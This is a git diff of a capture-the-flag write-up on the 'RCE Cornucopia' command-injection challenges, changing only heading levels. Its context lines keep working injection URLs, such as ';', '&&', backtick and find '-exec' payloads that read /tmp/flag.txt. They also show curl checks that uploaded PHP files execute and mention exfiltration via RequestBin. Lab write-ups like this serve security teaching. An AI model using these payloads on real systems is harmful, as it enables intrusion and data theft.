@@ -8,7 +8,7 @@ RCE Cornucopia is a series of remote code execution challenges created by [Dejan
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce000.png)
 
-# Challenge 1
+## Challenge 1
 
 For any challenge I like to observe the normal functionality of the application before trying anything funky. Enter an IP, hit submit. 
 
@@ -48,7 +48,7 @@ http://127.0.0.1:8081/index.php?ip=8.8.8.8;%20cat%20/tmp/flag.txt&submit=Ping!
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce1-003.png)
 
-# Challenge 2
+## Challenge 2
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce2-000.png)
 
@@ -82,7 +82,7 @@ http://127.0.0.1:8082/index.php?domain=google.com%20%26%26%20cat%20/tmp/flag.txt
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce2-003.png)
 
-# Challenge 3
+## Challenge 3
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce3-000.png)
 
@@ -122,7 +122,7 @@ http://127.0.0.1:8083/index.php?domain=`cat%20/tmp/flag.txt`.com&submit=Lookup
 
 If this was a CTF and capitalization was important for the scoreboard I'd guess based on the formatting of previous challenges.
 
-# Challenge 4
+## Challenge 4
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce4-000.png)
 
@@ -156,7 +156,7 @@ Yep.
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce4-003.png)
 
-# Challenge 5
+## Challenge 5
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce5-000.png)
 
@@ -196,7 +196,7 @@ Scan
 The "You can download the file here" link has a long hash-like name and serves the file as expected.
 
 ```
-# curl -v http://127.0.0.1:8085/uploads/df5c94a635fd6feb14aab94e5fd3ed10cdb13b2f0526bb1466c0e12474db93e3.txt
+## curl -v http://127.0.0.1:8085/uploads/df5c94a635fd6feb14aab94e5fd3ed10cdb13b2f0526bb1466c0e12474db93e3.txt
 *   Trying 127.0.0.1...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 8085 (#0)
@@ -227,7 +227,7 @@ Modify the request above to use a `.php` filename and replace the file contents 
 Answer to the first question is yes, we can upload PHP files. But will it execute?
 
 ```
-# curl -v http://127.0.0.1:8085/uploads/b0d0320f1440a2b9a325ead8338cd45aabc89740b8ea633c7dc4a5c856a6215a.php
+## curl -v http://127.0.0.1:8085/uploads/b0d0320f1440a2b9a325ead8338cd45aabc89740b8ea633c7dc4a5c856a6215a.php
 *   Trying 127.0.0.1...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 8085 (#0)
@@ -250,7 +250,7 @@ source: https://www.reddit.com/r/oneliners/comments/78mp1h/rip_boiling_water_you
 
 Yep.
 
-# Challenge 6
+## Challenge 6
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce6-000.png)
 
@@ -299,7 +299,7 @@ No metadata was found. Well I'm not surprised!
 Checking the link...
 
 ```
-# curl -v http://127.0.0.1:8086/uploads/420698287ca445da53fc584baca464ffa28bfa5421d9fd709df7b2785e6e3395.php
+## curl -v http://127.0.0.1:8086/uploads/420698287ca445da53fc584baca464ffa28bfa5421d9fd709df7b2785e6e3395.php
 *   Trying 127.0.0.1...
 * TCP_NODELAY set
 * Connected to 127.0.0.1 (127.0.0.1) port 8086 (#0)
@@ -322,7 +322,7 @@ Source: https://www.reddit.com/r/Showerthoughts/comments/1hwbdr/the_letter_b_in_
 
 Booyah.
 
-# Challenge 7
+## Challenge 7
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce7-000.png)
 
@@ -364,7 +364,7 @@ Can't quite read it so we'll take a look in the source. Why is the Reddit link f
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce7-005.png)
 
-# Challenge 8
+## Challenge 8
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce8-000.png)
 
@@ -442,7 +442,7 @@ http://127.0.0.1:8088/index.php?user=Sam%20-exec%20cat%20%2Ftmp%2Fflag.txt%20%7B
 
 Woo.
 
-# Challenge 9
+## Challenge 9
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-000.png)
 
@@ -454,7 +454,7 @@ http://127.0.0.1:8089/index.php?url=example.com&string=coordination&submit=Scan
 
 ![RCE Cornucopia](/img/rce-cornucopia/rce9-001.png)
 
-## Solution 1 - Web Request
+### Solution 1 - Web Request
 
 We'll assume the application, like previous challenges, is coded in a very straightforward way using `curl` and `grep`. Something like `curl <URL> | grep <string>` followed by some logic to check whether anything was matched.
 
@@ -520,7 +520,7 @@ And check RequestBin,
 
 Success.
 
-## Solution 2 - Blind Boolean
+### Solution 2 - Blind Boolean
 
 This challenge can be solved without requiring unlimited outbound Internet access from the web server. What if there was a white-list of domains or it could only be used internally on a local network? 
 
